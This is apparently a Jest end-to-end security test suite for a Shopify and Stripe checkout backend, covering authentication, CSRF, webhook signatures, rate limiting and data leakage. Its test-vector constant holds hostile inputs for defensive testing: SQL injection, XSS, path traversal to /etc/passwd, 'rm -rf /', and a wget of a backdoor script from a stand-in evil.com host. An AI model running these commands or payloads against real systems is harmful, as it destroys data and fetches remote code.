/**
 * Complete Backend Security E2E Flow Tests
 * 
 * Comprehensive end-to-end security validation for the R3 backend API,
 * covering the complete security landscape from initial request to order completion.
 * 
 * Security Test Categories:
 * - Authentication & Session Security
 * - Authorization & Access Control  
 * - Input Validation & Sanitization
 * - CSRF Protection
 * - Rate Limiting & DDoS Protection
 * - Webhook Security & Signature Validation
 * - Payment Security & PCI Compliance
 * - Data Privacy & Encryption
 * - Injection Attack Prevention
 * - Error Handling Security
 */

const envHelper = require('../../../shared/helpers/environment');

const { clearTestSessions, addTestSession } = require('../../../shared/helpers/utils/mock-handlers');
const fixtures = require('../../../shared/fixtures');
const crypto = require('crypto');

// Security test constants
const SECURITY_TEST_VECTORS = {
  sql_injection: [
    "'; DROP TABLE orders; --",
    "1' OR '1'='1",
    "admin'/*",
    "1; DELETE FROM users WHERE 1=1; --"
  ],
  xss_payloads: [
    "<script>alert('xss')</script>",
    "javascript:alert('xss')",
    "<img src=x onerror=alert('xss')>",
    "');alert('xss');//"
  ],
  path_traversal: [
    "../../../etc/passwd",
    "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
    "....//....//....//etc/passwd"
  ],
  command_injection: [
    "; rm -rf /",
    "| cat /etc/passwd",
    "&& wget http://evil.com/backdoor.sh"
  ],
  header_injection: [
    "test\r\nSet-Cookie: admin=true",
    "test\nLocation: http://evil.com",
    "test\r\n\r\n<script>alert('xss')</script>"
  ]
};

// Helper to generate webhook signatures
function generateWebhookSignature(payload, secret, timestamp = null) {
  timestamp = timestamp || Math.floor(Date.now() / 1000);
  const signedPayload = `${timestamp}.${JSON.stringify(payload)}`;
  const signature = crypto
    .createHmac('sha256', secret)
    .update(signedPayload)
    .digest('hex');
  
  return `t=${timestamp},v1=${signature}`;
}

describe('Backend Security E2E Flow Tests', () => {
  const backendUrl = envHelper.getApiUrl();
  const webhookSecret = process.env.STRIPE_WEBHOOK_SECRET_TEST || 'whsec_test_secret';
  
  beforeEach(() => {
    clearTestSessions();
  });

  describe('Authentication & Session Security Flow', () => {
    it('should enforce authentication on all protected endpoints', async () => {
      console.log('🔐 Testing authentication enforcement across API endpoints');
      
      const protectedEndpoints = [
        { method: 'POST', path: '/api/stripe/create-payment-intent' },
        { method: 'POST', path: '/api/calculate-shipping' },
        { method: 'POST', path: '/api/calculate-tax' },
        { method: 'POST', path: '/api/checkout/logout' }
      ];
      
      for (const endpoint of protectedEndpoints) {
        console.log(`Testing ${endpoint.method} ${endpoint.path}...`);
        
        // Test without Authorization header
        const noAuthResponse = await fetch(`${backendUrl}${endpoint.path}`, {
          method: endpoint.method,
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ test: 'data' })
        });
        
        expect(noAuthResponse.status).toBe(401);
        
        // Test with invalid token
        const invalidTokenResponse = await fetch(`${backendUrl}${endpoint.path}`, {
          method: endpoint.method,
          headers: {
            'Content-Type': 'application/json',
            'Authorization': 'Bearer invalid-token-12345'
          },
          body: JSON.stringify({ test: 'data' })
        });
        
        expect(invalidTokenResponse.status).toBe(401);
        
        console.log(`✅ ${endpoint.path} properly protected`);
      }
      
      console.log('✅ All protected endpoints enforce authentication');
    });

    it('should prevent session hijacking and fixation attacks', async () => {
      console.log('🛡️  Testing session hijacking prevention');
      
      // Create legitimate session
      const sessionResponse = await fetch(`${backendUrl}/api/checkout/session`, {
        method: 'POST',
        headers: { 
          'Content-Type': 'application/json',
          'Origin': 'https://sqqpyb-yq.myshopify.com'
        },
        body: JSON.stringify({
          cartToken: 'security-test-cart',
          cartTotal: 10000
        })
      });
      
      const session = await sessionResponse.json();
      
      // Attempt to use session from different origin
      const hijackAttempt = await fetch(`${backendUrl}/api/calculate-shipping`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${session.sessionToken}`,
          'x-csrf-token': session.csrfToken,
          'Origin': 'https://malicious-site.com' // Different origin
        },
        body: JSON.stringify({
          items: fixtures.valid.cart.basic.items,
          address: { postal_code: '10001', state: 'NY' }
        })
      });
      
      // Should reject due to origin mismatch
      expect(hijackAttempt.status).toBe(403);
      
      // Test session token tampering
      const tamperedToken = session.sessionToken.slice(0, -5) + '12345';
      const tamperAttempt = await fetch(`${backendUrl}/api/calculate-shipping`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${tamperedToken}`,
          'x-csrf-token': session.csrfToken,
          'Origin': 'https://sqqpyb-yq.myshopify.com'
        },
        body: JSON.stringify({
          items: fixtures.valid.cart.basic.items,
          address: { postal_code: '10001', state: 'NY' }
        })
      });
      
      expect(tamperAttempt.status).toBe(401);
      console.log('✅ Session hijacking prevention working');
    });

    it('should enforce session expiry and prevent replay attacks', async () => {
      console.log('⏰ Testing session expiry enforcement');
      
      // Create session
      const sessionResponse = await fetch(`${backendUrl}/api/checkout/session`, {
        method: 'POST',
        headers: { 
          'Content-Type': 'application/json',
          'Origin': 'https://sqqpyb-yq.myshopify.com'
        },
        body: JSON.stringify({
          cartToken: 'expiry-test-cart',
          cartTotal: 10000
        })
      });
      
      const session = await sessionResponse.json();
      
      // Test immediate use (should work)
      const immediateUse = await fetch(`${backendUrl}/api/calculate-shipping`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${session.sessionToken}`,
          'x-csrf-token': session.csrfToken,
          'Origin': 'https://sqqpyb-yq.myshopify.com'
        },
        body: JSON.stringify({
          items: fixtures.valid.cart.basic.items,
          address: { postal_code: '10001', state: 'NY' }
        })
      });
      
      expect(immediateUse.status).toBe(200);
      
      // Simulate expired session by creating a session with past timestamp
      const expiredSession = {
        sessionToken: `expired_${Date.now()}`,
        csrfToken: `expired_csrf_${Date.now()}`,
        expiresAt: Date.now() - 1000000 // Expired 1000 seconds ago
      };
      
      // Manually add expired session to test expiry handling
      addTestSession(expiredSession.sessionToken, expiredSession);
      
      const expiredUse = await fetch(`${backendUrl}/api/calculate-shipping`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${expiredSession.sessionToken}`,
          'x-csrf-token': expiredSession.csrfToken,
          'Origin': 'https://sqqpyb-yq.myshopify.com'
        },
        body: JSON.stringify({
          items: fixtures.valid.cart.basic.items,
          address: { postal_code: '10001', state: 'NY' }
        })
      });
      
      expect(expiredUse.status).toBe(401);
      console.log('✅ Session expiry properly enforced');
    });
  });

  describe('CSRF Protection E2E Flow', () => {
    it('should enforce CSRF tokens on all state-changing operations', async () => {
      console.log('🛡️  Testing CSRF protection across complete flow');
      
      // Create session
      const sessionResponse = await fetch(`${backendUrl}/api/checkout/session`, {
        method: 'POST',
        headers: { 
          'Content-Type': 'application/json',
          'Origin': 'https://sqqpyb-yq.myshopify.com'
        },
        body: JSON.stringify({
          cartToken: 'csrf-test-cart',
          cartTotal: 10000
        })
      });
      
      const session = await sessionResponse.json();
      
      const csrfTestEndpoints = [
        {
          path: '/api/stripe/create-payment-intent',
          body: { amount: 10000, currency: 'usd' }
        },
        {
          path: '/api/checkout/logout',
          body: {}
        }
      ];
      
      for (const endpoint of csrfTestEndpoints) {
        // Test without CSRF token
        const noCsrfResponse = await fetch(`${backendUrl}${endpoint.path}`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${session.sessionToken}`,
            'Origin': 'https://sqqpyb-yq.myshopify.com'
            // Missing x-csrf-token
          },
          body: JSON.stringify(endpoint.body)
        });
        
        expect(noCsrfResponse.status).toBe(403);
        
        // Test with wrong CSRF token
        const wrongCsrfResponse = await fetch(`${backendUrl}${endpoint.path}`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${session.sessionToken}`,
            'x-csrf-token': 'wrong-csrf-token',
            'Origin': 'https://sqqpyb-yq.myshopify.com'
          },
          body: JSON.stringify(endpoint.body)
        });
        
        expect(wrongCsrfResponse.status).toBe(403);
        
        console.log(`✅ ${endpoint.path} CSRF protection working`);
      }
      
      console.log('✅ CSRF protection enforced across all endpoints');
    });

    it('should prevent CSRF attacks from malicious origins', async () => {
      console.log('🚫 Testing CSRF attack prevention');
      
      // Create legitimate session
      const sessionResponse = await fetch(`${backendUrl}/api/checkout/session`, {
        method: 'POST',
        headers: { 
          'Content-Type': 'application/json',
          'Origin': 'https://sqqpyb-yq.myshopify.com'
        },
        body: JSON.stringify({
          cartToken: 'csrf-attack-test',
          cartTotal: 10000
        })
      });
      
      const session = await sessionResponse.json();
      
      // Simulate CSRF attack from malicious site
      const maliciousOrigins = [
        'https://evil-site.com',
        'https://attacker.com',
        'https://phishing-site.com'
      ];
      
      for (const origin of maliciousOrigins) {
        const attackResponse = await fetch(`${backendUrl}/api/stripe/create-payment-intent`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${session.sessionToken}`,
            'x-csrf-token': session.csrfToken, // Attacker somehow got CSRF token
            'Origin': origin // Malicious origin
          },
          body: JSON.stringify({
            amount: 999999, // Large amount
            currency: 'usd',
            metadata: { 
              customer_email: 'victim@example.com',
              attack_attempt: 'true'
            }
          })
        });
        
        // Should be rejected due to origin mismatch
        expect(attackResponse.status).toBe(403);
        console.log(`✅ Attack from ${origin} blocked`);
      }
      
      console.log('✅ CSRF attacks successfully prevented');
    });
  });

  describe('Input Validation & Injection Prevention', () => {
    it('should prevent SQL injection attacks in all inputs', async () => {
      console.log('💉 Testing SQL injection prevention');
      
      // Create session first
      const sessionResponse = await fetch(`${backendUrl}/api/checkout/session`, {
        method: 'POST',
        headers: { 
          'Content-Type': 'application/json',
          'Origin': 'https://sqqpyb-yq.myshopify.com'
        },
        body: JSON.stringify({
          cartToken: 'sql-injection-test',
          cartTotal: 10000
        })
      });
      
      const session = await sessionResponse.json();
      
      // Test SQL injection in payment intent metadata
      for (const payload of SECURITY_TEST_VECTORS.sql_injection) {
        const injectionResponse = await fetch(`${backendUrl}/api/stripe/create-payment-intent`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${session.sessionToken}`,
            'x-csrf-token': session.csrfToken,
            'Origin': 'https://sqqpyb-yq.myshopify.com'
          },
          body: JSON.stringify({
            amount: 10000,
            currency: 'usd',
            metadata: {
              customer_email: payload, // SQL injection attempt
              customer_first_name: payload,
              customer_last_name: payload
            }
          })
        });
        
        // Should either sanitize or reject
        if (injectionResponse.status === 200) {
          const responseData = await injectionResponse.json();
          // If accepted, check that SQL syntax was sanitized
          expect(responseData.paymentIntentId).toBeDefined();
        } else {
          // Or should be rejected with 400 for invalid input
          expect(injectionResponse.status).toBe(400);
        }
      }
      
      console.log('✅ SQL injection prevention working');
    });

    it('should prevent XSS attacks in all text inputs', async () => {
      console.log('🚨 Testing XSS prevention');
      
      const sessionResponse = await fetch(`${backendUrl}/api/checkout/session`, {
        method: 'POST',
        headers: { 
          'Content-Type': 'application/json',
          'Origin': 'https://sqqpyb-yq.myshopify.com'
        },
        body: JSON.stringify({
          cartToken: 'xss-test-cart',
          cartTotal: 10000
        })
      });
      
      const session = await sessionResponse.json();
      
      for (const xssPayload of SECURITY_TEST_VECTORS.xss_payloads) {
        const xssResponse = await fetch(`${backendUrl}/api/stripe/create-payment-intent`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${session.sessionToken}`,
            'x-csrf-token': session.csrfToken,
            'Origin': 'https://sqqpyb-yq.myshopify.com'
          },
          body: JSON.stringify({
            amount: 10000,
            currency: 'usd',
            metadata: {
              customer_email: 'test@example.com',
              customer_first_name: xssPayload, // XSS attempt
              items: JSON.stringify([{
                title: xssPayload // XSS in product title
              }])
            }
          })
        });
        
        if (xssResponse.status === 200) {
          // Should sanitize XSS payloads
          const responseData = await xssResponse.json();
          expect(responseData.paymentIntentId).toBeDefined();
          // XSS payload should be sanitized in any returned data
        } else {
          expect(xssResponse.status).toBe(400);
        }
      }
      
      console.log('✅ XSS prevention working');
    });

    it('should validate and sanitize payment amounts', async () => {
      console.log('💰 Testing payment amount validation');
      
      const sessionResponse = await fetch(`${backendUrl}/api/checkout/session`, {
        method: 'POST',
        headers: { 
          'Content-Type': 'application/json',
          'Origin': 'https://sqqpyb-yq.myshopify.com'
        },
        body: JSON.stringify({
          cartToken: 'amount-validation-test',
          cartTotal: 10000
        })
      });
      
      const session = await sessionResponse.json();
      
      const invalidAmounts = [
        -1000,      // Negative amount
        0,          // Zero amount  
        1000000,    // Extremely high amount
        'invalid',  // Non-numeric
        null,       // Null value
        undefined,  // Undefined
        '"><script>alert("xss")</script>' // XSS attempt in amount
      ];
      
      for (const amount of invalidAmounts) {
        const invalidAmountResponse = await fetch(`${backendUrl}/api/stripe/create-payment-intent`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${session.sessionToken}`,
            'x-csrf-token': session.csrfToken,
            'Origin': 'https://sqqpyb-yq.myshopify.com'
          },
          body: JSON.stringify({
            amount: amount,
            currency: 'usd',
            metadata: {
              customer_email: 'amount-test@example.com'
            }
          })
        });
        
        expect(invalidAmountResponse.status).toBe(400);
        const errorData = await invalidAmountResponse.json();
        expect(errorData.error).toContain('Invalid amount');
      }
      
      console.log('✅ Payment amount validation working');
    });
  });

  describe('Webhook Security E2E Flow', () => {
    it('should enforce webhook signature validation strictly', async () => {
      console.log('🔏 Testing webhook signature validation');
      
      const validPayload = {
        id: 'evt_test_webhook_security',
        type: 'payment_intent.succeeded',
        data: {
          object: {
            id: 'pi_test_security_webhook',
            status: 'succeeded',
            amount: 10000,
            metadata: {
              customer_email: 'webhook-security@example.com',
              environment: 'test'
            }
          }
        }
      };
      
      // Test 1: Missing signature header
      const noSignatureResponse = await fetch(`${backendUrl}/webhook/stripe`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(validPayload)
      });
      
      expect(noSignatureResponse.status).toBe(400);
      
      // Test 2: Invalid signature format
      const invalidFormatResponse = await fetch(`${backendUrl}/webhook/stripe`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'stripe-signature': 'invalid-signature-format'
        },
        body: JSON.stringify(validPayload)
      });
      
      expect(invalidFormatResponse.status).toBe(400);
      
      // Test 3: Wrong signature (tampered payload)
      const validSignature = generateWebhookSignature(validPayload, webhookSecret);
      const tamperedPayload = {
        ...validPayload,
        data: {
          ...validPayload.data,
          object: {
            ...validPayload.data.object,
            amount: 999999 // Tampered amount
          }
        }
      };
      
      const tamperedResponse = await fetch(`${backendUrl}/webhook/stripe`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'stripe-signature': validSignature // Valid signature for different payload
        },
        body: JSON.stringify(tamperedPayload)
      });
      
      expect(tamperedResponse.status).toBe(400);
      
      // Test 4: Replay attack (old timestamp)
      const oldTimestamp = Math.floor(Date.now() / 1000) - 3600; // 1 hour ago
      const oldSignature = generateWebhookSignature(validPayload, webhookSecret, oldTimestamp);
      
      const replayResponse = await fetch(`${backendUrl}/webhook/stripe`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'stripe-signature': oldSignature
        },
        body: JSON.stringify(validPayload)
      });
      
      expect(replayResponse.status).toBe(400);
      
      // Test 5: Valid signature should work
      const currentSignature = generateWebhookSignature(validPayload, webhookSecret);
      const validResponse = await fetch(`${backendUrl}/webhook/stripe`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'stripe-signature': currentSignature
        },
        body: JSON.stringify(validPayload)
      });
      
      expect(validResponse.status).toBe(200);
      
      console.log('✅ Webhook signature validation working correctly');
    });

    it('should prevent webhook replay attacks', async () => {
      console.log('🔄 Testing webhook replay attack prevention');
      
      const paymentIntent = {
        id: 'pi_test_replay_prevention',
        status: 'succeeded',
        amount: 10000,
        metadata: {
          customer_email: 'replay-test@example.com',
          environment: 'test'
        }
      };
      
      const webhookPayload = {
        id: 'evt_test_replay_prevention',
        type: 'payment_intent.succeeded',
        data: { object: paymentIntent }
      };
      
      const signature = generateWebhookSignature(webhookPayload, webhookSecret);
      
      // First webhook delivery (should succeed)
      const firstResponse = await fetch(`${backendUrl}/webhook/stripe`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'stripe-signature': signature
        },
        body: JSON.stringify(webhookPayload)
      });
      
      expect(firstResponse.status).toBe(200);
      
      // Second webhook delivery (replay - should still succeed but not process twice)
      const replayResponse = await fetch(`${backendUrl}/webhook/stripe`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'stripe-signature': signature
        },
        body: JSON.stringify(webhookPayload)
      });
      
      expect(replayResponse.status).toBe(200); // Returns 200 but doesn't process again
      
      console.log('✅ Webhook replay prevention working');
    });
  });

  describe('Rate Limiting & DDoS Protection', () => {
    it('should enforce rate limits per IP/session', async () => {
      console.log('🚦 Testing rate limiting enforcement');
      
      const rateLimitTests = [];
      const requestCount = 50;
      
      // Fire rapid requests
      for (let i = 0; i < requestCount; i++) {
        rateLimitTests.push(
          fetch(`${backendUrl}/api/checkout/session`, {
            method: 'POST',
            headers: { 
              'Content-Type': 'application/json',
              'Origin': 'https://sqqpyb-yq.myshopify.com',
              'X-Forwarded-For': '192.168.1.100' // Simulate same IP
            },
            body: JSON.stringify({
              cartToken: `rate-limit-test-${i}`,
              cartTotal: 10000
            })
          })
        );
      }
      
      const responses = await Promise.all(rateLimitTests);
      const successfulRequests = responses.filter(r => r.status === 200).length;
      const rateLimitedRequests = responses.filter(r => r.status === 429).length;
      
      // Should have some rate limiting in effect
      expect(rateLimitedRequests).toBeGreaterThan(0);
      expect(successfulRequests).toBeLessThan(requestCount);
      
      console.log(`📊 Rate Limiting Results:`);
      console.log(`   Total Requests: ${requestCount}`);
      console.log(`   Successful: ${successfulRequests}`);
      console.log(`   Rate Limited: ${rateLimitedRequests}`);
      console.log('✅ Rate limiting working correctly');
    });

    it('should block malicious request patterns', async () => {
      console.log('🛡️  Testing malicious pattern detection');
      
      const maliciousPatterns = [
        // Rapid identical requests
        Array(10).fill(0).map(() => ({
          path: '/api/checkout/session',
          body: { cartToken: 'identical-request', cartTotal: 10000 }
        })),
        
        // Requests with suspicious user agents
        [{
          path: '/api/checkout/session',
          headers: { 'User-Agent': 'sqlmap/1.0' },
          body: { cartToken: 'suspicious-ua', cartTotal: 10000 }
        }],
        
        // Requests with known attack signatures
        [{
          path: '/api/checkout/session',
          body: { 
            cartToken: '../../../etc/passwd',
            cartTotal: 10000 
          }
        }]
      ];
      
      for (const pattern of maliciousPatterns) {
        const promises = pattern.map(req => 
          fetch(`${backendUrl}${req.path}`, {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
              'Origin': 'https://sqqpyb-yq.myshopify.com',
              ...(req.headers || {})
            },
            body: JSON.stringify(req.body)
          })
        );
        
        const responses = await Promise.all(promises);
        const blockedRequests = responses.filter(r => r.status === 429 || r.status === 403).length;
        
        // Some requests should be blocked
        expect(blockedRequests).toBeGreaterThan(0);
      }
      
      console.log('✅ Malicious pattern detection working');
    });
  });

  describe('Payment Security & PCI Compliance', () => {
    it('should never expose sensitive payment data', async () => {
      console.log('💳 Testing payment data protection');
      
      // Create session and payment intent
      const sessionResponse = await fetch(`${backendUrl}/api/checkout/session`, {
        method: 'POST',
        headers: { 
          'Content-Type': 'application/json',
          'Origin': 'https://sqqpyb-yq.myshopify.com'
        },
        body: JSON.stringify({
          cartToken: 'payment-security-test',
          cartTotal: 10000
        })
      });
      
      const session = await sessionResponse.json();
      
      const paymentResponse = await fetch(`${backendUrl}/api/stripe/create-payment-intent`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${session.sessionToken}`,
          'x-csrf-token': session.csrfToken,
          'Origin': 'https://sqqpyb-yq.myshopify.com'
        },
        body: JSON.stringify({
          amount: 10000,
          currency: 'usd',
          metadata: {
            customer_email: 'payment-security@example.com',
            // Intentionally try to include sensitive data that should be filtered
            credit_card_number: '4242424242424242',
            cvv: '123',
            ssn: '123-45-6789'
          }
        })
      });
      
      expect(paymentResponse.status).toBe(200);
      const paymentData = await paymentResponse.json();
      
      // Response should not contain sensitive data
      const responseText = JSON.stringify(paymentData);
      expect(responseText).not.toContain('4242424242424242');
      expect(responseText).not.toContain('123-45-6789');
      
      // Should have client secret but not full payment details
      expect(paymentData.clientSecret).toBeDefined();
      expect(paymentData.paymentIntentId).toBeDefined();
      
      console.log('✅ Sensitive payment data properly protected');
    });

    it('should validate payment environment consistency', async () => {
      console.log('🌍 Testing payment environment security');
      
      const sessionResponse = await fetch(`${backendUrl}/api/checkout/session`, {
        method: 'POST',
        headers: { 
          'Content-Type': 'application/json',
          'Origin': 'https://sqqpyb-yq.myshopify.com'
        },
        body: JSON.stringify({
          cartToken: 'env-security-test',
          cartTotal: 10000
        })
      });
      
      const session = await sessionResponse.json();
      
      // Try to create production payment in test environment
      const prodAttemptResponse = await fetch(`${backendUrl}/api/stripe/create-payment-intent`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${session.sessionToken}`,
          'x-csrf-token': session.csrfToken,
          'Origin': 'https://sqqpyb-yq.myshopify.com'
        },
        body: JSON.stringify({
          amount: 10000,
          currency: 'usd',
          livemode: true, // Try to force production mode
          metadata: {
            customer_email: 'env-test@example.com',
            environment: 'production' // Conflicting environment
          }
        })
      });
      
      expect(prodAttemptResponse.status).toBe(200);
      const prodData = await prodAttemptResponse.json();
      
      // Should create test payment regardless of attempt to use production
      expect(prodData.paymentIntentId).toMatch(/^pi_test_/);
      
      console.log('✅ Environment consistency enforced');
    });
  });

  describe('Error Handling Security', () => {
    it('should not leak sensitive information in error messages', async () => {
      console.log('🚫 Testing secure error handling');
      
      const errorTestCases = [
        {
          name: 'Invalid session token',
          request: {
            path: '/api/stripe/create-payment-intent',
            headers: { 
              'Authorization': 'Bearer invalid-session-token-with-internal-info',
              'x-csrf-token': 'test'
            },
            expectedStatus: 401
          }
        },
        {
          name: 'Database connection error simulation',
          request: {
            path: '/api/checkout/session',
            body: {
              cartToken: 'db-error-test',
              cartTotal: 10000,
              test_scenario: 'database_error' // Special flag for testing
            },
            expectedStatus: 500
          }
        }
      ];
      
      for (const testCase of errorTestCases) {
        const response = await fetch(`${backendUrl}${testCase.request.path}`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'Origin': 'https://sqqpyb-yq.myshopify.com',
            ...(testCase.request.headers || {})
          },
          body: JSON.stringify(testCase.request.body || {})
        });
        
        expect(response.status).toBe(testCase.request.expectedStatus);
        
        const errorResponse = await response.text();
        
        // Error messages should not contain sensitive information
        const sensitivePatterns = [
          /password/i,
          /secret/i,
          /key/i,
          /token.*=.*[a-zA-Z0-9]/i,
          /database.*connection/i,
          /stack trace/i,
          /file path/i,
          /internal server/i
        ];
        
        for (const pattern of sensitivePatterns) {
          expect(errorResponse).not.toMatch(pattern);
        }
        
        console.log(`✅ ${testCase.name} - No sensitive info leaked`);
      }
      
      console.log('✅ Secure error handling verified');
    });
  });

  describe('Data Privacy & Encryption', () => {
    it('should handle PII data securely throughout flow', async () => {
      console.log('🔒 Testing PII data protection');
      
      const piiTestData = {
        customer_email: 'pii-test@example.com',
        customer_first_name: 'Privacy',
        customer_last_name: 'Testuser',
        customer_phone: '555-123-4567',
        shipping_address: JSON.stringify({
          address1: '123 Private Street',
          city: 'Confidential City',
          zip: '12345'
        })
      };
      
      // Create session
      const sessionResponse = await fetch(`${backendUrl}/api/checkout/session`, {
        method: 'POST',
        headers: { 
          'Content-Type': 'application/json',
          'Origin': 'https://sqqpyb-yq.myshopify.com'
        },
        body: JSON.stringify({
          cartToken: 'pii-test-cart',
          cartTotal: 10000
        })
      });
      
      const session = await sessionResponse.json();
      
      // Create payment intent with PII
      const paymentResponse = await fetch(`${backendUrl}/api/stripe/create-payment-intent`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${session.sessionToken}`,
          'x-csrf-token': session.csrfToken,
          'Origin': 'https://sqqpyb-yq.myshopify.com'
        },
        body: JSON.stringify({
          amount: 10000,
          currency: 'usd',
          metadata: piiTestData
        })
      });
      
      expect(paymentResponse.status).toBe(200);
      const paymentData = await paymentResponse.json();
      
      // PII should not be returned in API responses
      const responseText = JSON.stringify(paymentData);
      expect(responseText).not.toContain(piiTestData.customer_first_name);
      expect(responseText).not.toContain(piiTestData.customer_phone);
      expect(responseText).not.toContain('123 Private Street');
      
      // Should only return payment intent ID and client secret
      expect(paymentData.paymentIntentId).toBeDefined();
      expect(paymentData.clientSecret).toBeDefined();
      
      console.log('✅ PII data properly protected in responses');
    });
  });

  describe('Complete Security Flow Integration', () => {
    it('should maintain security throughout complete checkout flow', async () => {
      console.log('🔐 Testing end-to-end security in complete flow');
      
      // This test combines multiple security checks in a realistic flow
      
      // Step 1: Secure session creation
      const sessionResponse = await fetch(`${backendUrl}/api/checkout/session`, {
        method: 'POST',
        headers: { 
          'Content-Type': 'application/json',
          'Origin': 'https://sqqpyb-yq.myshopify.com'
        },
        body: JSON.stringify({
          cartToken: 'security-flow-test',
          cartTotal: 10000
        })
      });
      
      expect(sessionResponse.status).toBe(200);
      const session = await sessionResponse.json();
      
      // Step 2: Secure payment creation with validation
      const paymentResponse = await fetch(`${backendUrl}/api/stripe/create-payment-intent`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${session.sessionToken}`,
          'x-csrf-token': session.csrfToken,
          'Origin': 'https://sqqpyb-yq.myshopify.com'
        },
        body: JSON.stringify({
          amount: 10000,
          currency: 'usd',
          metadata: {
            customer_email: 'security-flow@example.com',
            customer_first_name: 'Secure',
            customer_last_name: 'Customer',
            environment: 'test'
          }
        })
      });
      
      expect(paymentResponse.status).toBe(200);
      const paymentData = await paymentResponse.json();
      
      // Step 3: Secure webhook processing
      const succeededIntent = {
        id: paymentData.paymentIntentId,
        status: 'succeeded',
        amount: 10000,
        metadata: {
          customer_email: 'security-flow@example.com',
          customer_first_name: 'Secure',
          customer_last_name: 'Customer',
          environment: 'test'
        }
      };
      
      const webhookPayload = {
        id: 'evt_security_flow_test',
        type: 'payment_intent.succeeded',
        data: { object: succeededIntent }
      };
      
      const signature = generateWebhookSignature(webhookPayload, webhookSecret);
      
      const webhookResponse = await fetch(`${backendUrl}/webhook/stripe`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'stripe-signature': signature
        },
        body: JSON.stringify(webhookPayload)
      });
      
      expect(webhookResponse.status).toBe(200);
      
      // Step 4: Secure session cleanup
      const logoutResponse = await fetch(`${backendUrl}/api/checkout/logout`, {
        method: 'POST',
        headers: {
          'Authorization': `Bearer ${session.sessionToken}`,
          'x-csrf-token': session.csrfToken,
          'Origin': 'https://sqqpyb-yq.myshopify.com'
        }
      });
      
      expect(logoutResponse.status).toBe(200);
      
      console.log('🎯 Complete security flow PASSED!');
      console.log('✅ All security controls maintained throughout entire flow');
    });
  });
});